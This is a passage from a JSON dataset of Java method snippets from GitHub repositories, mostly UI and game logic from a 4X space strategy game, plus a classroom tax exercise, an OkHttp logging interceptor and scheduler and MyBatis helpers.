text(\"SYSTEMS_UNCOLONIZED_NEED_TECH\", t1.name());            \n        }\n        return text(\"SYSTEMS_UNCOLONIZEABLE\"); \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55163, "method_name": "exploitAlertDescription", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String exploitAlertDescription(SystemView sv) { \n        Empire sysEmp = sv.empire();\n        if ((sysEmp == null) || !sysEmp.isPlayer())\n            return null;\n       \n        String eventMessage = randomEventStatus(sv);\n        if (!eventMessage.isEmpty()) {\n             if (sv.empire() == player())\n                 return eventMessage;\n        }\n        \n        Colony col = sv.system().colony();\n        if (col.inRebellion())\n            return text(\"SYSTEMS_STATUS_REBELLION\");\n        \n        if (col.creatingWaste()) \n            return text(\"SYSTEMS_EXPLOIT_WASTE\");\n        \n        int pct = (int) (100*col.currentProductionCapacity());\n        if (pct < 34)\n            return text(\"SYSTEMS_EXPLOIT_PCT\", pct); \n        else if (pct < 67)\n            return text(\"SYSTEMS_EXPLOIT_PCT\", pct); \n        else if (pct < 100)\n            return text(\"SYSTEMS_EXPLOIT_PCT\", pct); \n        return text(\"SYSTEMS_EXPLOIT_COMPLETE\"); \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55164, "method_name": "exterminateAlertDescription", "class_name": "SystemsUI", "params": ["SystemView"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String exterminateAlertDescription(SystemView sv) { \n        Empire pl = player();\n        if (sv.distance() > pl.scoutRange())\n            return null;\n        \n        // show enemy colonies as yellow\n        Empire sysEmp = sv.empire();\n        if (pl.atWarWith(sv.empId()))\n            return text(\"SYSTEMS_EXT_ENEMY\");\n        \n        // deal with enemy fleets orbiting systems around us\n        List<ShipFleet> fleets = sv.orbitingFleets();\n        for (ShipFleet fl: fleets) {\n            if (fl.isPotentiallyArmed(pl)) {\n                if (pl.atWarWith(fl.empId())) { \n                    if (sysEmp == null)\n                        return text(\"SYSTEMS_EXT_ENEMY_FLEET\");\n                    if (sysEmp.isPlayer())\n                        return text(\"SYSTEMS_EXT_ENEMY_FLEET_PLAYER\");\n                    else if (pl.alliedWith(sv.empId()))\n                        return text(\"SYSTEMS_EXT_ENEMY_FLEET_ALLY\");\n                    else\n                        return text(\"SYSTEMS_EXT_ENEMY_FLEET\");\n                }  \n            }\n        }\n        \n        // if we can see ship ETAs, look for armed enemy ships approaching\n        // player or allied colonies\n        if (pl.knowShipETA() && pl.alliedWith(sv.empId())) {\n            for (Ship sh: pl.visibleShips()) {\n                if ((sh.destSysId() == sv.sysId) && pl.atWarWith(sh.empId()) && sh.isPotentiallyArmed(pl)) {\n                    if (sysEmp.isPlayer())\n                        return text(\"SYSTEMS_EXT_INC_FLEET_PLAYER\");\n                    else \n                        return text(\"SYSTEMS_EXT_INC_FLEET_ALLY\");\n                }\n            }               \n        }\n        // for player systems, highlight those with no bases or insufficient shields\n        if ((sysEmp == null) || !sysEmp.isPlayer())\n            return null;\n\n        if (!sv.colony().defense().isCompleted())\n            return text(\"SYSTEMS_EXT_NEED_DEFENSE\");\n        \n        return null; \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55165, "method_name": "systemLabel2", "class_name": "SystemsUI", "params": ["StarSystem"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String systemLabel2(StarSystem sys) {\n        Empire pl = player();\n        int rng = pl.scoutRange();\n        SystemView sv = pl.sv.view(sys.id);\n        switch(selectedTab) {\n            case exploreTab:\n                int dist = (int) Math.ceil(sv.distance());\n                return (dist > 0) && (dist < rng+rng) ? text(\"SYSTEMS_RANGE\", str(dist)) : \"\";\n            case expandTab:\n                if (!sv.scouted())\n                    return \"\";\n                else if (sv.currentSize() == 0)\n                    return text(\"SYSTEMS_ENVIRONMENT_SIZE\", sv.planetType().name(), \"\");\n                else\n                    return text(\"SYSTEMS_ENVIRONMENT_SIZE\", sv.planetType().name(), str(sv.currentSize()));\n            case exploitTab: \n                return text(sv.resourceType());\n            case exterminateTab: \n                int bases = sv.bases();\n                int shield = sv.shieldLevel();\n                if ((bases == 0) && (shield == 0))\n                    return \"\";\n                String str1 = shield == 0 ? \"\" : text(\"SYSTEMS_SHIELD\", str(shield));\n                String str2 = bases == 0 ? \"\" : text(\"SYSTEMS_BASES\", str(bases));\n                return shield == 0 ? str2 : str1+\" \"+str2;\n        }\n        return \"\";     }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55166, "method_name": "keyPressed", "class_name": "SystemsUI", "params": ["KeyEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void keyPressed(KeyEvent e) {\n        switch(e.getKeyCode()) {\n                case KeyEvent.VK_ESCAPE:\n                    clearMapSelections();\n                    buttonClick();\n                    RotPUI.instance().selectMainPanel(false);\n                    return;\n                case KeyEvent.VK_EQUALS:\n                    if (e.isShiftDown())  {\n                        softClick();\n                        map().adjustZoom(-1);\n                    }\n                    return;\n                case KeyEvent.VK_MINUS:\n                    softClick();\n                    map().adjustZoom(1);\n                    return;\n                case KeyEvent.VK_UP:\n                    softClick();\n                    map().dragMap(0, s40);\n                    return;\n                case KeyEvent.VK_DOWN:\n                    softClick();\n                    map().dragMap(0, -s40);\n                    return;\n                case KeyEvent.VK_LEFT:\n                    softClick();\n                    map().dragMap(s40, 0);\n                    return;\n                case KeyEvent.VK_RIGHT:\n                    softClick();\n                    map().dragMap(-s40, 0);\n                    return;\n        }\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55167, "method_name": "mouseWheelMoved", "class_name": "SystemsUI", "params": ["MouseWheelEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void mouseWheelMoved(MouseWheelEvent e) {\n\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["IMapHandler", "ActionListener", "MouseWheelListener"], "modifiers": ["final", "public"]}}, {"id": 55168, "method_name": "initModel", "class_name": "MainTitlePanel", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void initModel() {\n            setOpaque(false);\n            setPreferredSize(new Dimension(getWidth(),s45));\n            addMouseListener(this);\n            addMouseMotionListener(this);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55169, "method_name": "textureArea", "class_name": "MainTitlePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Area", "snippet": "        public Area textureArea()       { return textureArea; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55170, "method_name": "textureName", "class_name": "MainTitlePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String textureName()     { return TEXTURE_BROWN; }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55171, "method_name": "paintComponent", "class_name": "MainTitlePanel", "params": ["Graphics"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void paintComponent(Graphics g0) {\n            super.paintComponent(g0);\n            Graphics2D g = (Graphics2D) g0;\n\n            int w = getWidth();\n            int h = getHeight();\n            int gap = s10;\n            int x0 = gap;\n            int y0 = h - s10;\n            String title = text(titleKey);\n            String dipLabel = text(\"SYSTEMS_TAB_EXPLORE\");\n            String intLabel = text(\"SYSTEMS_TAB_EXPAND\");\n            String milLabel = text(\"SYSTEMS_TAB_EXPLOIT\");\n            String statusLabel = text(\"SYSTEMS_TAB_EXTERMINATE\");\n\n            g.setColor(SystemPanel.orangeText);\n            g.setFont(narrowFont(32));\n            int titleW = g.getFontMetrics().stringWidth(title);\n            int titleSpacing = s60+s60;\n            g.drawString(title, x0,y0);\n\n            int tabW = (w-titleW-titleSpacing-(6*gap))/4;\n\n            x0 += (titleW+titleSpacing);\n            drawTab(g,x0,0,tabW,h,dipLabel, exploreBox, selectedTab.equals(exploreTab));\n            textureArea = new Area(new RoundRectangle2D.Float(x0,s10,tabW,h-s10,h/4,h/4));\n\n            x0 += (tabW+gap);\n            drawTab(g,x0,0,tabW,h,intLabel, expandBox, selectedTab.equals(expandTab));\n            Area tab2Area = new Area(new RoundRectangle2D.Float(x0,s10,tabW,h-s10,h/4,h/4));\n            textureArea.add(tab2Area);\n\n            x0 += (tabW+gap);\n            drawTab(g,x0,0,tabW,h,milLabel, exploitBox, selectedTab.equals(exploitTab));\n            Area tab3Area = new Area(new RoundRectangle2D.Float(x0,s10,tabW,h-s10,h/4,h/4));\n            textureArea.add(tab3Area);\n\n            x0 += (tabW+gap);\n            drawTab(g,x0,0,tabW,h,statusLabel, exterminateBox, selectedTab.equals(exterminateTab));\n            Area tab4Area = new Area(new RoundRectangle2D.Float(x0,s10,tabW,h-s10,h/4,h/4));\n            textureArea.add(tab4Area);\n            \n            g.setColor(selectedTabC);\n            g.fillRect(s10, h-s5, w-s20, s5);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55172, "method_name": "drawTab", "class_name": "MainTitlePanel", "params": ["Graphics2D", "int", "int", "int", "int", "String", "Rectangle", "boolean"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void drawTab(Graphics2D g, int x, int y, int w, int h, String label, Rectangle box, boolean selected) {\n            g.setFont(narrowFont(22));\n            if (selected)\n                g.setColor(selectedTabC);\n            else\n                g.setColor(unselectedTabC);\n\n            box.setBounds(x, y+s10, w, h-s10);\n            g.fillRoundRect(x, y+s10, w, h-s10, h/4, h/4);\n            g.fillRect(x, h-s5, w, s5);\n\n            if (box == hoverBox) {\n                Stroke prev = g.getStroke();\n                g.setStroke(stroke2);\n                g.setColor(Color.yellow);\n                g.setClip(x, y, w, h*2/3);\n                g.drawRoundRect(x, y+s10, w, h-s10, h/4, h/4);\n                g.setClip(x, y+h/2, w, h/2);\n                g.drawRect(x, y+s10, w, h);\n                g.setClip(null);\n                g.setStroke(prev);\n            }\n            int sw = g.getFontMetrics().stringWidth(label);\n            int x0 = x+((w-sw)/2);\n            int y0 = y+h-s10;\n\n            Color c0 = (box == hoverBox) ? Color.yellow : SystemPanel.whiteLabelText;\n            drawShadowedString(g, label, 3, x0, y0, SystemPanel.textShadowC, c0);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55173, "method_name": "selectNextTab", "class_name": "MainTitlePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void selectNextTab() {\n            switch(selectedTab) {\n                case exploreTab:     selectTab(expandTab); break;\n                case expandTab:      selectTab(exploitTab); break;\n                case exploitTab:     selectTab(exterminateTab); break;\n                case exterminateTab: selectTab(exploreTab); break;\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55174, "method_name": "selectPreviousTab", "class_name": "MainTitlePanel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void selectPreviousTab() {\n            switch(selectedTab) {\n                case exploreTab :    selectTab(exterminateTab); break;\n                case expandTab:      selectTab(exploreTab); break;\n                case exploitTab:     selectTab(expandTab); break;\n                case exterminateTab: selectTab(exploitTab); break;\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55175, "method_name": "selectTab", "class_name": "MainTitlePanel", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "        private void selectTab(String s) {\n            if (!selectedTab.equals(s)) {\n                softClick();\n                selectedTab = s;\n                instance.repaint();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55176, "method_name": "mouseClicked", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseClicked(MouseEvent e) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55177, "method_name": "mouseEntered", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseEntered(MouseEvent e) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55178, "method_name": "mouseExited", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseExited(MouseEvent e) {\n            if (hoverBox != null) {\n                hoverBox = null;\n                repaint();\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55179, "method_name": "mousePressed", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mousePressed(MouseEvent e) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55180, "method_name": "mouseReleased", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseReleased(MouseEvent e) {\n            if (e.getButton() > 3)\n                return;\n            int x = e.getX();\n            int y = e.getY();\n            if (hoverBox == null)\n                misClick();\n            else {\n                if (hoverBox == exploreBox)\n                    selectTab(exploreTab);\n                else if (hoverBox == expandBox)\n                    selectTab(expandTab);\n                else if (hoverBox == exploitBox)\n                    selectTab(exploitTab);\n                else if (hoverBox == exterminateBox)\n                    selectTab(exterminateTab);\n            }\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55181, "method_name": "mouseDragged", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseDragged(MouseEvent e) {}", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55182, "method_name": "mouseMoved", "class_name": "MainTitlePanel", "params": ["MouseEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void mouseMoved(MouseEvent e) {\n            int x = e.getX();\n            int y = e.getY();\n            Rectangle prevHover = hoverBox;\n            if (exploreBox.contains(x,y))\n                hoverBox = exploreBox;\n            else if (expandBox.contains(x,y))\n                hoverBox = expandBox;\n            else if (exploitBox.contains(x,y))\n                hoverBox = exploitBox;\n           else if (exterminateBox.contains(x,y))\n                hoverBox = exterminateBox;\n\n            if (hoverBox != prevHover)\n                repaint();\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "BasePanel", "implements": ["MouseMotionListener", "MouseListener"], "modifiers": []}}, {"id": 55183, "method_name": "clickAction", "class_name": "ExitFleetsButton", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void clickAction(int numClicks) {\n            // force recalcuate map bounds when returning\n            buttonClick();\n            RotPUI.instance().selectMainPanel(true);\n        }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/ui/map/SystemsUI.java", "stars": "74", "class_props": {"extends": "ExitButton", "implements": null, "modifiers": []}}, {"id": 55184, "method_name": "main", "class_name": "SteuernBeispielLoesung", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        // Teil 1\n        // Eingabe:\n        double einzelGehalt = 2000;\n        // Ausgabe: gezahlte Steuern\n        System.out.println(steuerSumme(einzelGehalt));\n\n        // Teil 2\n        // Eingabe:\n        double[] gehaeltern = {2000, 1234, 1238, 7261, 1238};\n\n        double summe = 0;\n        for (double gehalt: gehaeltern) {\n            summe += steuerSumme(gehalt);\n        }\n\n        System.out.println(summe);\n\n        // Ausgabe: Summe aller gezahlten Steuern\n    }", "url": "https://raw.githubusercontent.com/unterstein/dhbw-java-2020/master/src/SteuernBeispielLoesung.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55185, "method_name": "steuerSumme", "class_name": "SteuernBeispielLoesung", "params": ["double"], "throws": null, "modifiers": ["static"], "return_type": "double", "snippet": "    static double steuerSumme(double gehalt) {\n        if (gehalt < 2000) {\n            return gehalt * 0.15;\n        } else if (gehalt < 3000) {\n            return gehalt * 0.2;\n        } else if (gehalt < 4000) {\n            return gehalt * 0.3;\n        } else if (gehalt < 5000) {\n            return gehalt * 0.35;\n        } else\n            return gehalt * 0.4;\n    }", "url": "https://raw.githubusercontent.com/unterstein/dhbw-java-2020/master/src/SteuernBeispielLoesung.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55186, "method_name": "intercept", "class_name": "NetworkLogInterceptor", "params": ["Chain"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Response", "snippet": "    public Response intercept(Chain chain) throws IOException {\n        Request request = chain.request();\n        long t1 = System.nanoTime();//\u8bf7\u6c42\u53d1\u8d77\u7684\u65f6\u95f4\n        String rSubtype = null;\n        final RequestBody requestBody = request.body();\n        if (requestBody != null && requestBody.contentType() != null) {\n            rSubtype = requestBody.contentType().subtype();\n        }\n\n        if (isNotFileRequest(rSubtype)) {\n            Timber.d(\"Request: %s on %s%nRequest Params:%s %n%s\",\n                    request.url(),\n                    chain.connection(),\n                    bodyToString(request),\n                    request.headers());\n        }\n\n        Response response = chain.proceed(request);\n        long t2 = System.nanoTime();//\u6536\u5230\u54cd\u5e94\u7684\u65f6\u95f4\n        //\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528response.body\uff08\uff09.string()\u7684\u65b9\u5f0f\u8f93\u51fa\u65e5\u5fd7\n        //\u56e0\u4e3aresponse.body().string()\u4e4b\u540e\uff0cresponse\u4e2d\u7684\u6d41\u4f1a\u88ab\u5173\u95ed\uff0c\u7a0b\u5e8f\u4f1a\u62a5\u9519\uff0c\n        // \u6211\u4eec\u9700\u8981\u521b\u5efa\u51fa\u4e00\u4e2a\u65b0\u7684response\u7ed9\u5e94\u7528\u5c42\u5904\u7406\n        ResponseBody responseBody = response.peekBody(1024 * 1024);\n        if (responseBody != null) {\n            // final String content = responseBody.string();\n            final String content = uncompress(responseBody.bytes());\n            Timber.d(\"Response: [%s] %nResponse data:%s  %.1fms%n%s\",\n                    response.request().url(),\n                    content,\n                    (t2 - t1) / 1e6d,\n                    response.headers());\n        } else {\n            Timber.d(\"responseBody is null\");\n        }\n        return response;\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/NetworkLogInterceptor.java", "stars": "1", "class_props": {"extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"id": 55187, "method_name": "isNotFileRequest", "class_name": "NetworkLogInterceptor", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isNotFileRequest(final String subtype) {\n        return subtype != null && (subtype.contains(\"json\")\n                || subtype.contains(\"xml\")\n                || subtype.contains(\"plain\")\n                || subtype.contains(\"html\"));\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/NetworkLogInterceptor.java", "stars": "1", "class_props": {"extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"id": 55188, "method_name": "bodyToString", "class_name": "NetworkLogInterceptor", "params": ["Request"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "    private String bodyToString(final Request copy) {\n        try {\n            final Buffer buffer = new Buffer();\n            if (copy.body() == null)\n                return \"\";\n            copy.body().writeTo(buffer);\n            return buffer.readUtf8();\n            // return uncompress(buffer.readByteArray());\n        } catch (final IOException e) {\n            return \"{\\\"err\\\": \\\"\" + e.getMessage() + \"\\\"}\";\n        }\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/NetworkLogInterceptor.java", "stars": "1", "class_props": {"extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"id": 55189, "method_name": "gzip", "class_name": "NetworkLogInterceptor", "params": ["RequestBody"], "throws": null, "modifiers": ["private"], "return_type": "RequestBody", "snippet": "    private RequestBody gzip(final RequestBody body) {\n        return new RequestBody() {\n            @Override\n            public MediaType contentType() {\n                return body.contentType();\n            }\n\n            @Override\n            public long contentLength() {\n                return -1; // \u65e0\u6cd5\u77e5\u9053\u538b\u7f29\u540e\u7684\u6570\u636e\u5927\u5c0f\n            }\n\n            @Override\n            public void writeTo(BufferedSink sink) throws IOException {\n                BufferedSink gzipSink = Okio.buffer(new GzipSink(sink));\n                body.writeTo(gzipSink);\n                gzipSink.close();\n            }\n        };\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/NetworkLogInterceptor.java", "stars": "1", "class_props": {"extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"id": 55190, "method_name": "uncompress", "class_name": "NetworkLogInterceptor", "params": ["byte"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "String", "snippet": "    public String uncompress(byte str[]) throws IOException {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try (GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(str))) {\n            int b;\n            while ((b = gis.read()) != -1) {\n                baos.write((byte) b);\n            }\n        }\n        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {\n            return new String(baos.toByteArray(), StandardCharsets.UTF_8);\n        }\n        return new String(baos.toByteArray());\n    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/net/interceptor/NetworkLogInterceptor.java", "stars": "1", "class_props": {"extends": null, "implements": ["Interceptor"], "modifiers": ["public"]}}, {"id": 55191, "method_name": "getSharedNum", "class_name": "AzkabanAppJointLinkisSharedJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getSharedNum() {\n        return this.sharedNum;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/AzkabanAppJointLinkisSharedJob.java", "stars": "18", "class_props": {"extends": "AzkabanAppJointLinkisJob", "implements": ["SharedJob"], "modifiers": ["public"]}}, {"id": 55192, "method_name": "getSharedKey", "class_name": "AzkabanAppJointLinkisSharedJob", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSharedKey() {\n        String projectId = getJobProps().get(LinkisJobTypeConf.PROJECT_ID);\n        String flowId = getJobProps().get(LinkisJobTypeConf.FLOW_NAME);\n        String flowExecId = getJobProps().get(LinkisJobTypeConf.FLOW_EXEC_ID);\n        String nodeId = getJobProps().get(LinkisJobTypeConf.JOB_ID);\n        return projectId + \".\" + flowId + \".\" + flowExecId + \".\" + nodeId;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/AzkabanAppJointLinkisSharedJob.java", "stars": "18", "class_props": {"extends": "AzkabanAppJointLinkisJob", "implements": ["SharedJob"], "modifiers": ["public"]}}, {"id": 55193, "method_name": "setSharedNum", "class_name": "AzkabanAppJointLinkisSharedJob", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSharedNum(int sharedNum) {\n        this.sharedNum = sharedNum;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/linkis/job/AzkabanAppJointLinkisSharedJob.java", "stars": "18", "class_props": {"extends": "AzkabanAppJointLinkisJob", "implements": ["SharedJob"], "modifiers": ["public"]}}, {"id": 55194, "method_name": "isSimpleType", "class_name": "SimpleTypeRegistry", "params": ["Class<?>"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean isSimpleType(Class<?> clazz) {\n    return SIMPLE_TYPE_SET.contains(clazz);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/type/SimpleTypeRegistry.java", "stars": "15", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 55195, "method_name": "initCombat", "class_name": "OrionGuardianShip", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initCombat() {\n        combatStacks().clear();\n        addCombatStack(new CombatStackOrionGuardian());       \n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/OrionGuardianShip.java", "stars": "74", "class_props": {"extends": "SpaceMonster", "implements": null, "modifiers": ["public"]}}, {"id": 55196, "method_name": "plunder", "class_name": "OrionGuardianShip", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void plunder() { \n        super.plunder();\n        Empire emp = this.lastAttacker();\n        for (String techId: techs)\n            emp.plunderShipTech(tech(techId), -2); \n        \n        // find the system with this monster and remove it\n        int sysId = StarSystem.NULL_ID;\n        for (StarSystem sys: galaxy().starSystems()) {\n            if (sys.monster() == this) {\n                sys.monster(null);\n                sysId = sys.id;\n                break;\n            }\n        }\n        \n        // all empires now know this system is no longer guarded\n        for (Empire emp1: galaxy().empires()) \n            emp1.sv.view(sysId).refreshSystemEntryScan();\n    }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/OrionGuardianShip.java", "stars": "74", "class_props": {"extends": "SpaceMonster", "implements": null, "modifiers": ["public"]}}, {"id": 55197, "method_name": "killIncident", "class_name": "OrionGuardianShip", "params": ["Empire"], "throws": null, "modifiers": ["protected"], "return_type": "DiplomaticIncident", "snippet": "    protected DiplomaticIncident killIncident(Empire emp) { return KillGuardianIncident.create(emp.id, lastAttackerId, nameKey); }", "url": "https://raw.githubusercontent.com/rayfowler/rotp-public/master/src/rotp/model/galaxy/OrionGuardianShip.java", "stars": "74", "class_props": {"extends": "SpaceMonster", "implements": null, "modifiers": ["public"]}}, {"id": 55198, "method_name": "setUp", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void setUp() {\n        switchingEventProcessor = new SwitchingEventProcessor(\n                subscribingEventProcessor, markerAwareTrackingEventProcessor);\n    }", "url": "https://raw.githubusercontent.com/everest-engineering/lhotse/master/axon-support/src/test/java/engineering/everest/lhotse/axon/replay/SwitchingEventProcessorTest.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 55199, "method_name": "willStartReplay", "class_name": "SwitchingEventProcessorTest", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void willStartReplay() {\n        switchingEventProcessor.startReplay(startPosition, replayMarkerEvent);\n        